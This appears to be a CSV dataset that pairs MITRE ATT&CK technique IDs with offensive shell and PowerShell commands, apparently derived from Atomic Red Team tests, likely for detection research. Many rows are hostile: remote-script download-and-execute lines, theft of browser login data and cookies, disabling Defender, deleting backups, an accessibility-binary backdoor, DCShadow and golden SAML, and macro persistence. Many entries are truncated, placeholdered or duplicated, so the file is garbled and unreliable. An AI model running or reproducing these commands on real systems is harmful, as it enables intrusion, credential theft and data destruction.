mitre_id,command
T1136,"new-localuser -name ""#{username}"" -nopassword"
T1090,"[  ""$(uname)""  =  'freebsd'  ]  &&  sysrc  tor_enable=""yes""  &&  service  tor  start  ||  sudo  systemctl  start  tor> /dev/null 2>&1 # id_44"
T1040,pktmon.exe start --etw -f %temp%\t1040.etl timeout \t 5 >nul 2>&1 pktmon.exe stop
T1016,"$ports = get-content ""var_493 $results = ""there were a total of $totalopen open ports out of $totalports ports tested."" $results | out-file -encoding ascii -append $file write-host $results"
T1137,"$excelapp  =  new-object  -comobject  ""excel.application""  if(-not  $excelapp.path.contains(""program  files  (x86)"")){  write-host  ""64-bit  office""  $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"")  }  else{  write-host  ""32-bit  office""  $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"")  }"
T1069,ldifde.exe -f var_671 -p subtree
T1055,"""var_38909"""
T1115,"dir | clip echo ""t1115"" > %temp%\t1115.txt clip < %temp%\t1115.txt> /dev/null 2>&1 # id_18"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f# run_8136
T1033,"cmd.exe \c whoami wmic useraccount get \all quser \server:""var_481 ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > computers.txt @for \f %n in (computers.txt) do @for \f ""tokens=1,2"" %i in ('qwinsta \server:%n ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > usernames.txt"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""# run_3773"
T1573,$server_ip = var_53769
T1106,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe \out:""var_310"" %tmp%\t1106.exe"
T1135,df -ah smbutil view -g \\var_998
T1047,"wmic \node:var_41883"""
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""> /dev/null 2>&1 # id_96"
T1497,"if  [  ""$(sysctl  -n  hw.hv_vendor)""  !=  """"  ];  then  echo  ""virtualization  environment  detected"";  fi# run_9208"
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_74784 write-host ""end of federation configuration."""
T1562,"""c:\program files\windows defender\mpcmdrun.exe"" -removedefinitions -all"
T1529,shutdown \s \t var_34391
T1222,var_194 \tmp\ t1222002
T1136,"net user \add ""var_84434"""
T1070,"get-childitem ""#{file_path}"" | % { $_.creationtime = ""#{target_date_time}"" }# run_5392"
T1580,aws ec2 describe-security-groups --profile var_995
T1049,$syntaxlist = var_85856
T1132,echo -n 111-11-1111 | base64 curl -xpost var_497
T1197,"set  ""var_704  \eventname:desktopimgdownldr"
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh# run_2888
T1070,docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log
T1611,"echo ""current user: var_281"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1040,"""c:\program files\wireshark\tshark.exe"" -i var_334 -c 5"
T1531,"connect-azuread $userprincipalname = ""var_386"" remove-azureaduser -objectid $userprincipalname"
T1049,sockstat  -4  sockstat  -6  2>\dev\null  ||  true  sockstat  -l  2>\dev\null  ||  true
T1543,"new-service -name ""var_354"""
T1573,$server_ip  =  var_495
T1021,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" \v portnumber \t reg_dword \d var_444"
T1218,"#{regsvr32path}\#{regsvr32name} /s /i ""#{dll_name}""> /dev/null 2>&1 # id_97"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_381"" -verbose"
T1564,sudo dscl . -create /users/#{user_name} ishidden 1> /dev/null 2>&1 # id_10
T1555,"copy-item ""$env:appdata\opera software\opera stable\login data"" -destination ""pathtoatomicsfolder\..\externalpayloads"""
T1119,get-service  >  $env:temp\t1119_1.txt  get-childitem  env:  >  $env:temp\t1119_2.txt  get-process  >  $env:temp\t1119_3.txt> /dev/null 2>&1 # id_46
T1614,var_69567
T1018,"for ip in $(seq var_5730.$ip up"" || : ; done"
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_20722"
T1137,reg.exe add hkcu\software\microsoft\office\var_256 \f
T1558,"cmd.exe \c ""var_84440"""
T1574,"write-host ""creating system environment variables"" -foregroundcolor cyan new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_profiler"" -propertytype string -value ""var_805"" -force | out-null"
T1027,truncate -s +1 #{file_to_pad} #adds a byte to the file size
T1078,new-azautomationrunbook -name #{runbook_name} -type powershell -resourcegroupname #{resource_group} -description 'my-test-runbook' -automationaccountname #{automation_account_name}# run_9138
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  1# run_3239"
T1552,$cert  =  new-selfsignedcertificate  -dnsname  atomicredteam.com  -certstorelocation  cert:\localmachine\my  set-location  cert:\localmachine\my  export-certificate  -type  cert  -cert  cert:\localmachine\my\$($cert.thumbprint)  -filepath  var_940
T1221,"start ""var_33143"""
T1071,"invoke-webrequest var_720 -useragent ""*<|>*"" | out-null"
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_101"""
T1040,sudo var_221 -4 -p 6 -t 3
T1490,vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%> /dev/null 2>&1 # id_29
T1490,del \s \f \q c:\*.vhd c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk# run_7020
T1041,if(-not (test-path var_248 -method post -body $filecontent -disablekeepalive
T1046,docker  build  -t  t1046  $pathtoatomicsfolder\t1046\src\  docker  run  --name  t1046_container  --rm  -d  -t  t1046  docker  exec  t1046_container  \scan.sh# run_3190
T1615,get-gpo  -domain  $env:userdnsdomain  var_68574
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_748
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_261\extension\"" -passthru"
T1074,"compress-archive -path ""var_99219 -force"
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath var_733"
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v noclose /t reg_dword /d 1 /f"
T1129,"var_468"""
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_64"
T1578,gcloud  compute  snapshots  create  var_79547
T1074,"compress-archive -path ""var_130 -force"
T1053,schtasks \create \sc once \tn spawn \tr var_10267
T1140,encoded=$(echo 'var_351 | b64decode -r
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" var_26672 -gcb -sc trustdmp"
T1202,"scriptrunner.exe -appvscript ""var_499"""
T1135,dir \\var_442\ipc$
T1564,net  user  var_519$  \t  reg_dword  \d  0
T1548,sudo -l sudo cat /etc/sudoers sudo vim /etc/sudoers> /dev/null 2>&1 # id_30
T1543,"copy ""var_54760"" %systemroot%\system32\ sc create w64time binpath= ""%systemroot%\system32\svchost.exe -k timeservice"" type= share start=auto sc config w64time displayname= ""windows 64 time"" sc description w64time ""maintain date and time synch on all clients and services in the network"" reg add ""hklm\software\microsoft\windows nt\currentversion\svchost"" \v timeservice \t reg_multi_sz \d ""w64time"" \f reg add ""hklm\system\currentcontrolset\services\w64time\parameters"" \v servicedll \t reg_expand_sz \d ""%systemroot%\system32\w64time.dll"" \f sc start w64time"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_848"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1489,sudo killall -sigterm var_38498
T1571,test-netconnection -computername var_861
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_979"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1546,if not exist c:\windows\system32\narrator_backup.exe (copy c:\windows\system32\narrator.exe c:\windows\system32\narrator_backup.exe) else ( pushd ) takeown /f c:\windows\system32\narrator.exe /a icacls c:\windows\system32\narrator.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\narrator.exe
T1204,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""c:\windows\system32\mshta.exe"" http://localhost/hello6.hta'> /dev/null 2>&1 # id_37"
T1070,rd /s /q %systemdrive%\$recycle.bin
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}> /dev/null 2>&1 # id_52
T1090,netsh interface portproxy add v4tov4 listenport=var_50134
T1041,"$dnsserver = ""var_467"
T1007,net.exe start >> var_99594
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_966"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1082,wscript.exe c:\windows\system32\gathernetworkinfo.vbs# run_8272
T1547,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""userinit"" ""userinit.exe, #{binary_to_execute}"" -force"
T1001,"cat ""var_480"" | tail -n 1 | base64 -d | sh"
T1136,kubectl run var_72391'
T1615,"powershell -nop -exec bypass -c ""iex (new-object net.webclient).downloadstring('https://github.com/bc-security/empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); get-domaingpo""> /dev/null 2>&1 # id_31"
T1567,"$apikey = ""var_57757 $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }# run_7490"
T1133,"$extlist = var_276 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1567,new-item  var_800:test  -v
T1133,"$extlist  =  var_680  start  chrome  start-sleep  -seconds  30  stop-process  -name  ""chrome"""
T1136,aws iam create-user --user-name var_71618
T1047,wmic process call create var_51641
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_674
T1531,$pword = convertto-securestring -string var_357
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_424 write-host ""end of golden saml"""
T1039,"copy-item  -path  ""\\var_841"""
T1611,if [ ! -d var_89379 2>&1
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive\t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }# run_9859"
T1529,shutdown  \s  \t  var_831
T1491,"$notepath = join-path $env:temp ""var_497"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1134,"set-executionpolicy -scope process bypass -force $owners = @{} gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user} get-process | select processname,id,@{l=""owner"";e={$owners[$_.id.tostring()]}} & ""$pathtoatomicsfolder\t1134.002\src\gettoken.ps1""; [myprocess]::createprocessfromparent((get-process lsass).id,""cmd.exe"")"
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""var_175"" -credential $creds"
T1489,net.exe stop var_868
T1615,gpresult /z> /dev/null 2>&1 # id_63
T1133,"$extlist = var_754 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1569,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\var_158 -accepteula ""%systemroot%\system32\calc.exe"""
T1048,tar czpf - \users\* | openssl des3 -salt -pass var_800 'cat > \users.tar.gz.enc'
T1074,"compress-archive -path ""var_19458 -force"
T1578,az snapshot create --resource-group var_834 --location eastus
T1120,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') printercheck -noninteractive -consoleoutput> /dev/null 2>&1 # id_61
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_39968"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f> /dev/null 2>&1 # id_62
T1570,new-smbmapping -remotepath 'var_65090' 'z:\'
T1486,7z a -p var_7767
T1110,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe bruteuser --dc var_525 $env:temp\bruteuser.txt testuser1"
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_790"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1497,"$manufacturer = get-wmiobject -class win32_computersystem | select-object -expandproperty ""manufacturer"" $model = get-wmiobject -class win32_computersystem | select-object -expandproperty ""model"" if((($manufacturer.tolower() -eq ""microsoft corporation"") -and ($model.tolower().contains(""virtual""))) -or ($manufacturer.tolower().contains(""vmware"")) -or ($model.tolower() -eq ""virtualbox"")) {write-host ""virtualization environment detected!""} else {write-host ""no virtualization environment detected!""}> /dev/null 2>&1 # id_17"
T1119,get-service  >  $env:temp\t1119_1.txt  get-childitem  env:  >  $env:temp\t1119_2.txt  get-process  >  $env:temp\t1119_3.txt
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh# run_5010
T1124,net time \\var_92305 w32tm \tz
T1614,var_280
T1218,"wuauclt.exe /updatedeploymentprovider ""#{arbitrary_dll}"" /runhandlercomserver"
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_13269 of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }# run_6128"
T1056,"prompt_command='history -a >(tee -a ~/.bash_history |logger -t ""$user[$$] $ssh_connection "")' echo ""\$prompt_command=$prompt_command"" tail /var/log/syslog> /dev/null 2>&1 # id_74"
T1134,"var_594""  ""exit"""
T1027,"invoke-webrequest -uri var_789"""
T1197,start-bitstransfer -priority foreground -source var_619
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh# run_5162
T1562,"wmic.exe /namespace:\\root\microsoft\windows\defender class msft_mppreference call add exclusionpath=\""atomicredteam\"""
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f> /dev/null 2>&1 # id_41
T1187,rpcping -s var_36620 \a connect \u ntlm 1>$null
T1571,test-netconnection -computername var_694
T1090,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat""# run_2290"
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive# run_7996
T1012,reg.exe  query  hklm\software\microsoft\windows\softwareinventorylogging  \v  collectionstate  \reg:64> /dev/null 2>&1 # id_94
T1619,"try{$response = invoke-webrequest ""https:\\var_32959 -append"
T1221,"start ""var_109"""
T1123,sh var_60910
T1134,"var_11942"" ""exit"""
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_7988
T1053,"crontab -l > /tmp/notevil echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}"
T1114,"powershell -executionpolicy bypass -command ""var_95716"
T1550,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\kevin-robertson\invoke-thehash\01ee90f934313acc7d09560902443c18694ed0eb\invoke-wmiexec.ps1' -usebasicparsing);invoke-wmiexec -target var_769
T1531,"connect-azuread $userprincipalname = ""var_207"" remove-azureaduser -objectid $userprincipalname"
T1007,powershell.exe  get-service; echo 83 > $null
T1082,"cscript  ""var_51555"""
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_938 -method post -body $cyphertext -disablekeepalive"
T1016,test-netconnection -computername var_343
T1129,"var_885"""
T1072,"""%programfiles(x86)%\var_91437"""
T1539,"osascript  -e  'tell  application  ""finder""'  -e  'set  destinationfolderpath  to  posix  file  ""var_743""'  -e  'set  safarifolder  to  ((path  to  library  folder  from  user  domain  as  text)  &  ""containers:com.apple.safari:data:library:cookies:"")'  -e  'duplicate  file  ""cookies.binarycookies""  of  folder  safarifolder  to  folder  destinationfolderpath  with  replacing'  -e  'end  tell'"
T1033,set file=#{output_file_path}\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%# run_1168
T1611,"echo ""current user: var_762"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1016,test-netconnection  -commontcpport  http  -computername  var_619
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_24103 write-host ""end of golden saml"""
T1573,$server_ip  =  var_272
T1115,echo ifconfig | pbcopy $(pbpaste)
T1120,fsutil  fsinfo  drives# run_8518
T1036,"mkdir  $home\...  cp  $(which  sh)  $home\...  $home\...\sh  -c  ""echo  var_81365"""
T1025,"powershell.exe  -c  ""get-volume  |  where-object  {$_.drivetype  -eq  'removable'}  |  foreach-object  {  get-childitem  -path  ($_.driveletter  +  ':\*')  -recurse  -include  '*.doc*','*.xls*','*.txt','*.pdf'  -erroraction  silentlycontinue  |  foreach-object  {write-output  $_.fullname}  }  ;  if  (-not  (get-volume  |  where-object  {$_.drivetype  -eq  'removable'}))  {  write-output  'no  removable  media.'  }""# run_9185"
T1046,nmap -pn -sv -p var_413
T1078,net user var_63293 \active:yes
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached> /dev/null 2>&1 # id_75"
T1135,net view \\#{computer_name}> /dev/null 2>&1 # id_78
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""# run_6320"
T1609,kubectl create -f var_11579
T1105,rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
T1609,kubectl create -f var_87454
T1106,"c:\windows\microsoft.net\framework\v4.0.34928\csc.exe \out:""var_77708"" %tmp%\t1106.exe"
T1137,"# registry setting to ""trust access to the vba project object model"" in word $registrykey = ""hkcu:software\microsoft\office\16.0\word\security"" $registryvalue = ""accessvbom"" $registrydata = ""1"" # the path where a flag text file will be created if registry setting did not already exist or if it was set to 0 $flagpath1 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag1.txt"" $flagpath2 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag2.txt"" # get the value of the key/value pair $value = (get-itemproperty -path $registrykey -name $registryvalue -erroraction silentlycontinue).$registryvalue # logical operation to: if the value of the key/value is 1, do nothing - # if the value is 0, change it to 1 and create flag1 - # if it doesn't exist, create the value and flag2 if ($value -eq ""1"") { write-host ""the registry value '$registryvalue' already exists with the required setting."" } elseif ($value -eq ""0"") { write-host ""the registry value was set to 0, temporarily changing to 1."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag1"" > $flagpath1 } else { write-host ""the registry value '$registryvalue' does not exist, temporarily creating it."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag2"" > $flagpath2 } add-type -assemblyname microsoft.office.interop.word # define the path of copied normal template for restoral $copypath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal1.dotm"" # define the path to the normal template $docpath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal.dotm"" # create copy of orginal template for restoral copy-item -path $docpath -destination $copypath -force # vba code to be insterted as a macro # will create a scheduled task to open the calculator at 8:04pm daily $vbacode = @"" sub autoexec() dim applicationpath as string dim taskname as string dim runtime as string dim schtaskscmd as string applicationpath = ""c:\windows\system32\calc.exe"" taskname = ""opencalctask"" runtime = ""20:04"" schtaskscmd = ""schtasks /create /tn """""" & taskname & """""" /tr """""" & applicationpath & """""" /sc daily /st "" & runtime & "" /f"" shell ""cmd.exe /c "" & schtaskscmd, vbnormalfocus end sub ""@ # create a new instance of word.application $word = new-object -comobject word.application # keep the word application hidden $word.visible = $false # open the document $document = $word.documents.open($docpath) # access the vba project of the document $vbaproject = $document.vbproject # add a new module to the vba project $newmodule = $vbaproject.vbcomponents.add(1) # 1 = vbext_ct_stdmodule # add the vba code to the new module $newmodule.codemodule.addfromstring($vbacode) # run the macro $word.run(""autoexec"") # save and close the document $document.saveas($docpath) $document.close() # quit word $word.quit() # release com objects [system.runtime.interopservices.marshal]::releasecomobject($document) | out-null [system.runtime.interopservices.marshal]::releasecomobject($word) | out-null [system.runtime.interopservices.marshal]::releasecomobject($vbaproject) | out-null [system.runtime.interopservices.marshal]::releasecomobject($newmodule) | out-null# run_6909"
T1039,"copy-item -path ""\\#{remote}\c$\#{share_file}"" -destination ""$env:temp\#{local_file}"""
T1012,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging \v collectionstate \reg:64# run_9378
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_160"
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_696"" net start sesshijack"
T1486,"echo ""var_878"
T1556,"sudo sed -i ""var_756"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n a = shell(`""cmd.exe /c wscript.exe //e:jscript #{jse_path}`"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}""# run_7581"
T1114,"powershell -executionpolicy bypass -command ""var_11664"
T1033,set file=var_497\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_383""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
